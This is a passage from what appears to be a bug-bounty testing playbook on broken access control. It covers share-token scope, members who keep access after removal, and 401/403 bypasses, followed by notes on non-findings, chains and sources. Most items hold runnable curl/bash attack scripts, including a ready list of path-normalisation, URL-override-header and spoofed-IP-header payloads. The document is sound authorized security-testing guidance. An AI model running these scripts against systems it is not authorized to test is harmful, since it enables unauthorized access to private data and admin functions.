  curl -sS "${HDR[@]}" "$S" | tee "$D/02-share-anon.json" | jq -c 'keys'
  # 1. object scope: the same token on things it was not issued for
  for p in "/documents/<B doc 2>" "/documents/<B doc 1>/attachments" "/documents/<B doc 1>/versions" "/documents/<B doc 1>/comments" \
           "/folders/<parent folder id>" "/users/<B user id>" "/documents"; do
    curl -sS "${HDR[@]}" -H "X-Share-Token: $TOK" -o "$D/scope.body" -w "%{http_code} %{size_download} $p hits=" "$T/api/v1$p?share_token=$TOK"; grep -c '<marker of B doc 2>' "$D/scope.body"; sleep 1; done | tee "$D/scope.txt"
  # 2. permission scope: a harmless edit with the view token; then the share's own settings
  curl -sS -i "${HDR[@]}" -X PATCH "$T/api/v1/documents/<B doc 1>?share_token=$TOK" -H 'Content-Type: application/json' -d '{"title":"bac016"}' | head -12
  curl -sS -i "${HDR[@]}" -X PATCH "$S" -H 'Content-Type: application/json' -d '{"permission":"edit","expires_at":null,"password":null}' | head -12
  # 3. password or expiry enforced by the page only (set a password on the link as B first)
  curl -sS "${HDR[@]}" "$S/download" -o "$D/dl.bin" -w 'download without the password: %{http_code} %{size_download}\n'
  # 4. lifetime: B revokes; the token and the URLs obtained through it are tried again
  curl -sS "${HDR[@]}" $B -X DELETE "$S" -o /dev/null -w 'revoke: %{http_code}\n'; date -u +%FT%TZ
  curl -sS "${HDR[@]}" "$S" -o /dev/null -w 'after revoke: %{http_code}\n'; curl -sS "${HDR[@]}" "$S/download" -o /dev/null -w 'download after revoke: %{http_code} %{size_download}\n'
  ```
- **Proof:** with the token of document 1 and no session: the marker of B's document 2 in the response; or B's
  view of document 1 showing the edit; or the content served after the revocation, with both timestamps.
- **Not a finding when:** an "anyone with the link" object is read by someone with the link. A folder link shows
  the folder's children. A view-only link lets the viewer save what it displays: "hide download" is a
  preference, not a boundary, and paid only small amounts on a product that sells it as a control (#1194606,
  #1965156, #1878255). A revoked link is served from a cache for a few minutes.
- **Escalate:** a short or sequential token: measure length and alphabet on five links of our own; guessing
  others needs `bruteforce-ok`. A token sent to third-party scripts in the `Referer` header goes to the INF
  chapter. "Save a copy to my account" with a view token is BAC-007. A file-request link that writes into other
  folders of its owner (#3304830) is the write side of the same scope failure and is reported under this item.

### BAC-017 · A removed member or a downgraded role keeps access to the tenant's objects

| | |
|---|---|
| **Severity** | Medium standalone when a removed or downgraded account still reads private data; High when it still writes, or when access survives through a credential the tenant cannot see or revoke |
| **Requires** | multi-tenant\|roles\|invite, two-accounts\|priv-accounts |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Improper Privilege Management · CWE-269 |
| **Prior art** | #962604, #3852102, #119221, #700831 |

- **Where:** everything the account held while it was a member: its session, API keys and personal access
  tokens, OAuth grants and installed apps, share links it created, webhooks it registered, open WebSocket
  connections, invitations it sent, objects it authored or was assigned to, scheduled exports.
- **Test:** removal deletes the membership row. Each access path has its own idea of who may enter: a token
  carries the old role, an object grants access to its `author_id`, a socket is never re-authorised, an API key
  is checked against the key table and not against membership. Record what the member holds, remove or
  downgrade it, replay everything, and read an object created after the removal.
- **How:**
  ```bash
  D="$E/evidence/$H/BAC-017"; mkdir -p "$D"; W=$(awk "BEGIN{print 1/$RATE}"); ORG='<tenant id>'
  ADMIN="-H @$E/accounts/ADM.headers"    # the admin of the tenant; $A is a member. With two-accounts only: B invites A first and ADMIN=$B
  # 1. while A is a member: create what A can keep
  curl -sS "${HDR[@]}" $A -X POST "$T/api/v1/api-keys" -H 'Content-Type: application/json' -d '{"name":"bac017"}' | tee "$D/01-key.json"; KEY='<key from 01-key.json>'
  curl -sS "${HDR[@]}" $A -X POST "$T/api/v1/documents/<tenant doc id>/share" -H 'Content-Type: application/json' -d '{"permission":"view"}' | tee "$D/02-share.json"
  # paths.txt: one GET path per line: tenant lists, private objects, objects A authored, the member list
  run() { while read -r p; do curl -sS "${HDR[@]}" "$@" -o /dev/null -w "%{http_code} %{size_download} $p\n" "$T$p"; sleep "$W"; done < "$D/paths.txt"; }
  run $A | tee "$D/03-member-session.txt"; run -H "Authorization: Bearer $KEY" | tee "$D/03-member-key.txt"
  # 2. the admin removes A (second run of the item: downgrade A to the lowest role instead)
  curl -sS -i "${HDR[@]}" $ADMIN -X DELETE "$T/api/v1/orgs/$ORG/members/<A membership id>" | head -3; date -u +%FT%TZ | tee "$D/04-removed-at.txt"
  # 3. the admin creates a new private note after the removal: the removed account must not be able to read it
  curl -sS "${HDR[@]}" $ADMIN -X POST "$T/api/v1/orgs/$ORG/notes" -H 'Content-Type: application/json' -d '{"title":"bac017-after-removal"}' | tee "$D/05-new-note.json"
  # 4. replay at once, after 10 minutes and after 60 minutes: session, API key, share link
  run $A | tee "$D/06-removed-session.txt"; run -H "Authorization: Bearer $KEY" | tee "$D/06-removed-key.txt"
  curl -sS "${HDR[@]}" "$T/api/v1/shares/<share token from 02-share.json>" -o /dev/null -w 'share link made by the removed member: %{http_code}\n'
  curl -sS "${HDR[@]}" $A "$T/api/v1/orgs/$ORG/notes/<id from 05-new-note.json>" -w '\n%{http_code}\n'
  curl -sS -i "${HDR[@]}" $A -X PATCH "$T/api/v1/orgs/$ORG/notes/<id from 05-new-note.json>" -H 'Content-Type: application/json' -d '{"title":"bac017-edited-after-removal"}' | head -3
  diff "$D/03-member-session.txt" "$D/06-removed-session.txt"
  ```
  The admin re-adds A afterwards and deletes the key, the link and the note.
- **Proof:** the removal with its timestamp and the member list without A, then a later request by the removed
  account that returns the note created after the removal, or changes it. State which credential still worked
  (session, key, link) and for how long you observed it.
- **Not a finding when:** access ends within a token or cache lifetime of a few minutes: programmes close that
  as session handling (`session-expiry`). The removed account sees only what it authored and the product says
  authors keep access. Notifications sent before the removal. Data A downloaded while it was a member. A
  downgraded role keeps exactly what the lower role is allowed.
- **Escalate:** an API key, OAuth grant or webhook that the admin cannot list or revoke is the strongest form:
  rate it High. An invitation the removed member sent earlier that lets it back in (#3303136) is BAC-015. A
  socket that keeps delivering events is BAC-010. A disabled or deleted account that still authenticates
  (#1577940) belongs to the AUT chapter.

### BAC-018 · A denied path (401 or 403) is served through another spelling, a URL-override header or a client-address header

| | |
|---|---|
| **Severity** | High standalone when the bypass returns an admin function or private data; Medium for an internal page with limited content; None when only a static file, a login form or an error page is reached |
| **Requires** | login\|admin-panel |
| **Excluded by** | — |
| **Unit** | host |
| **Cost** | medium |
| **Weakness** | Forced Browsing · CWE-425 |
| **Prior art** | #991717, #1004007, #1224089, #382678 |

- **Where:** paths that answer 401 or 403, or redirect to the login page, in the content-discovery output under
  `$E/recon/$H/`: `/admin`, `/internal`, `/manage`, `/console`, `/actuator`, `/server-status`, `/metrics`,
  `/debug`, `/api/internal/`. The unit is the host because the deny rule lives in that host's front end.
- **Test:** three causes with one symptom. The front end (CDN, WAF, nginx `location`, gateway, middleware)
  matches the raw path while the application router normalises it. The application takes its routing path from
  a header that only a trusted proxy should set. The deny rule is an address allow-list that reads the client
  address from a request header.
- **How:**
  ```bash
  D="$E/evidence/$H/BAC-018"; mkdir -p "$D"; W=$(awk "BEGIN{print 1/$RATE}")
  P=admin                                         # the denied path, without its leading slash
  # one request per row: status, size, body hash, label. $1 is the label, the rest are curl arguments.
  row() { local l=$1; shift; : > "$D/v.body"; curl -sS --path-as-is "${HDR[@]}" -o "$D/v.body" -w '%{http_code} %{size_download} ' "$@"
          echo "$(md5sum < "$D/v.body" | cut -c1-8) $l"; sleep "$W"; }
  # baselines: the denied path, a path that cannot exist, the login page
  for u in "/$P" "/bac018-$RANDOM" "/login"; do row "BASELINE $u" "$T$u"; done | tee "$D/baseline.txt"
  # 1. path spellings (--path-as-is stops curl from normalising them)
  for v in "/$P/" "//$P" "///$P//" "/./$P" "/$P/." "/$P;/" "/$P;x=1" "/;/$P" "/.;/$P" "/x/..;/$P" "/x/../$P" "/%2e/$P" "/$P%2f" "/$P%20" "/$P%09" \
           "/$P%00" "/$P.json" "/$P.html" "/$P.css" "/$P?" "/$P/~" "/${P^^}" "/${P^}" "/%$(printf '%x' "'${P:0:1}")${P:1}" "/$P%252f" "/x%2f..%2f$P" "/$P\\"; do
    row "$v" "$T$v"; done | tee "$D/paths.txt"
  # 2. URL-override headers: request an allowed path and name the denied one in the header
  for h in "X-Original-URL: /$P" "X-Rewrite-URL: /$P" "X-Override-URL: /$P" "X-Forwarded-Uri: /$P" "X-Forwarded-Prefix: /$P" "X-Request-URI: /$P"; do
    row "GET / + $h" -H "$h" "$T/"; done | tee "$D/url-headers.txt"
  # 3. client-address headers on the denied path
  for h in "X-Forwarded-For: 127.0.0.1" "X-Real-IP: 127.0.0.1" "X-Client-IP: 127.0.0.1" "X-Originating-IP: 127.0.0.1" "True-Client-IP: 127.0.0.1" \
           "X-Forwarded-For: 10.0.0.1" "Forwarded: for=127.0.0.1" "X-Forwarded-Host: localhost" "X-Custom-IP-Authorization: 127.0.0.1"; do
    row "$h" -H "$h" "$T/$P"; done | tee "$D/ip-headers.txt"
  # a hit is a row whose status and body hash match none of the three baselines (bodies with a per-request token: compare sizes)
  awk 'NR==FNR{b[$1" "$3]=1; next} !(($1" "$3) in b)' "$D/baseline.txt" "$D/paths.txt" "$D/url-headers.txt" "$D/ip-headers.txt"
  ```
  When the denial is role-based (a 403 for a logged-in member), repeat steps 1 and 2 with `$A` in the request.
  Fetch a hit once more and save it with `-D-`; then request one data-bearing resource behind it and stop.
- **Proof:** the denied baseline and the bypass request side by side (status, size, body hash), and the body of
  the bypass showing content that exists only behind the control: an admin page with data, or an API response.
  One page is enough; do not browse further.
- **Not a finding when:** the body hash equals the not-found baseline or the login page (a soft 404, an SPA
  shell, a catch-all 200). The variant resolves to a different, public resource (`/admin.css` answered by the
  static handler). The 200 is the WAF's own block page. The page reached is itself a login form. A
  client-address header changes only the logged address or the rate-limit bucket (`rate-limit`).
- **Escalate:** admin functions behind the bypass go to BAC-011, a known product panel to the CVE chapter,
  actuator or debug endpoints to the INF chapter. A method rule in place of a path rule is BAC-012. The same
  disagreement between front end and origin, used on the request boundary, is the SMG chapter;
  `X-Original-URL` or `X-Forwarded-Host` reflected into a cached response is the CCH chapter.

## Graveyard

- **IDOR behind an unguessable id with no leak.** "Requires the victim's UUID" is closed informative or low.
  Park it, run BAC-005, and report only with the route that yields the id.
- **Leaked ids as the finding.** User ids, UUIDs or internal ids in a response, with no route that accepts them.
- **Existence oracles.** 403 for a real id and 404 for a missing one, a result count, "this address is already
  a member". Informative; `user-enum` where the policy lists it.
- **Self-IDOR and same-tenant visibility.** Changing our own objects through an odd route, or a colleague's
  object that the product's permission table lets our role see.
- **Admin against owner in one tenant.** Most threat models trust admins. "An admin can remove the owner" is
  low or informative unless the documentation promises otherwise.
- **UI-only restrictions that are not boundaries.** A hidden button for a function the role's API documentation
  allows, "hide download" on a file the viewer can read, plan limits enforced in the client (BIZ chapter).
- **A 200 that changed nothing.** Write requests that return success while the victim's view stays the same.
- **401/403 bypass onto nothing.** A path trick that returns the SPA shell, a static file, a soft 404 or a login
  form. An exposed admin login page with no way in is the same.
- **Client-address headers that only move the rate-limit bucket** (`rate-limit`).
- **Access that ends with the session or token cache** after a removal or downgrade (`session-expiry`). Minutes
  are accepted risk; an API key that never dies is not.
- **Public by design.** Public profiles, published listings, "anyone with the link" shares, invitation links
  documented as reusable.
- **Third-party widgets.** An IDOR in an embedded help desk, chat or payment page the organisation does not
  operate (`third-party`).
- **Scanner matrices.** The output of an authorisation-diff tool without a marker and a victim-side proof
  (`automated`).
- **Formula cells in an export** (`csv-injection`).
- **Duplicates of one root cause.** Ten endpoints that share one missing check are one report. Filed
  separately they earn one bounty and nine duplicates: sweep first, report the set.

## Chains

- BAC-005 → BAC-001, BAC-002, BAC-003, BAC-004: the disclosed id is the missing half of a UUID-keyed IDOR.
- BAC-003 on B's e-mail, phone or password field → AUT items: a password reset to the new address is account
  takeover, proven on B.
- BAC-006 → BAC-011: an admin function with another tenant's id. JWT-010 is the same failure inside a token.
- BAC-018 → BAC-011, CVE and INF items: what the bypass exposes (admin functions, product panels, actuator).
- BAC-012 (state change accepted over GET) → CSR items: the victim's browser performs it from a link.
- BAC-014 → API items (mass assignment), JWT-001 and JWT-002 (a role claim in a client-held token).
- BAC-002 ↔ GQL-004, GQL-005, GQL-006: the schema-driven form of the same swap. BAC-010 ↔ GQL-011, WSS items.
- BAC-003 or BAC-007 writing markup into B's object → XSS items: stored XSS across the tenant boundary.
- BAC-007 (import by URL or archive) → SSR-001, LFI items. BAC-008 (rendered report) → SSR-007.
- BAC-015, BAC-016 (single-use tokens) → RAC items: redeem twice in parallel.
- BAC-017 → BAC-010, BAC-015: sockets and pending invitations that outlive the membership.
- CCH (cache deception) and SMG (request smuggling) reach the same data with no authorisation flaw in the
  application: when the BAC items are negative on a cached or proxied asset, those chapters are next.

## Sources

- `kb/reports/access-control.md` and `kb/reports/all/access-control.md`: the disclosed reports this chapter is
  built from. `docs/06-severity.md` has the vectors for cross-tenant IDOR and member-to-admin escalation;
  `docs/04-evidence-standard.md` has the victim-side proof rules; `playbooks/PB-13-signals.md` maps signals to
  these items.
- HexBrain: `get_testing_playbook {"topic":"IDOR"}`, `get_testing_playbook {"topic":"Broken Access Control"}`,
  `find_bypasses {"protection":"403 forbidden"}`.
- OWASP WSTG-ATHZ-02 (bypassing authorisation schema), WSTG-ATHZ-03 (privilege escalation), WSTG-ATHZ-04
  (insecure direct object references); OWASP API Security Top 10 2023: API1 (BOLA), API3 (BOPLA), API5 (BFLA).
- PortSwigger Web Security Academy, Access control vulnerabilities.
- Orange Tsai, "Breaking Parser Logic: Take Your Path Normalization Off and Pop 0days Out" (2018).
